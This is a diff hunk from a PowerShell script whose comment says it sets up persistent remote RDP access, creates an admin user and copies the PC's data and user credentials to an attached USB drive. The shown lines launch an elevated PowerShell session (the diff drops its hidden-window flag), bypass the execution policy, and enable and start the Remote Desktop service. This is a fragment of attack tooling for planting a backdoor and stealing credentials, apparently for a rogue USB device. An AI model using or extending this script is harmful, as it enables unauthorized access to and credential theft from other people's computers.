@@ -5,7 +5,7 @@
 # REM  create constent remote rdp , create a user with admin rights and send the data of the pc with user creds  to a usb 
 # mass storage device that is connected
 
-Start-Process powershell -Verb runAs -WindowStyle hidden
+Start-Process powershell -Verb runAs
 Set-ExecutionPolicy Bypass -Force
 Set-Service -Name TermService -StartupType Automatic
 Start-Service TermService
